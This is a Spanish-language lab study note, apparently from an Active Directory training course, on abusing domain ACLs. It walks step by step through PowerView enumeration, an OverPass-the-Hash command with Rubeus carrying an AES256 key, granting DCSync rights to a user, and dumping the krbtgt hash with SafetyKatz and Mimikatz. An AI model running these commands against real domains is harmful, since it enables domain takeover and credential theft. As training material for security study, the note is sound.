# Rights Abuse using ACLs 

Tags: #AD #Windows #Powershell #ACL 

```bash 
- Existen aún más ACLs interesantes que pueden ser abusadas.
- Por ejemplo, con privilegios de 'Domain Admin (DA)', la ACL del **dominio raíz** puede modificarse para otorgar permisos útiles como 'FullControl' o la capacidad de ejecutar 'DCSync'.
```

## Enumeración 

```powershell 
❯ . .\PowerView.ps1  # Importar el módulo 

Paso 1:
❯ Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
# Enumerar las ACLs del dominio para verificar si el usuario "studentx" posee permisos de replicación DCSync o privilegios elevados como GenericAll sobre el objeto raíz del dominio
```

```powershell 
# Si no los tiene se le agregan al usuario 'studentx' de la siguiente manera:

Paso 2:
# Hacer OPTH con el usuario admin del server ejecutando el siguiente comando en una consola cmd en la máquina de atacante como administrador local la cual abrira una nueva consola con ese ticket y es ahi donde se ejecutan los siguientes comandos

❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
# Solicitar un TGT legítimo para el usuario "svcadmin" utilizando su clave AES256 mediante OverPass-the-Hash/OverPass-the-Key, creando una nueva sesión netonly con una CMD aislada e inyectando el ticket Kerberos en memoria para autenticarse como dicho usuario

Paso 3: 
❯ C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat    # Ejecutar powershell 
❯ . C:\AD\Tools\PowerView.ps1                     # Importar PowerView


Paso 4: 
❯ Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
# Agregar permisos de replicación DCSync al usuario "studentx" sobre el objeto raíz del dominio para permitirle solicitar hashes y secretos de Active Directory mediante técnicas de replicación

# Cerrar la consola 
```

```powershell 
# En una consola normal verificar que ahora el usuario 'studentx' ya cuente con los permisos de DCSync 

Paso 5: 
❯ Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}


# Verifar lo siguiente: 
	ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
	ActiveDirectoryRights  : ExtendedRight
	ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
	IdentityName           : dcorp\studentx
```

## DCSync 

```powershell 
Paso 6: 

# Hacer el DCSync con el usuario con los permisos pero abriendo un cmd como usuario administrador local 
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit" 


# Otras opciones 
❯ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
# Ejecutar DCSync para volcar el hash de krbtgt vía PowerShell usando Invoke-Mimikatz.

❯ .\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
# Igual que el anterior pero usando SafetyKatz — alternativa evasiva para el mismo objetivo.
```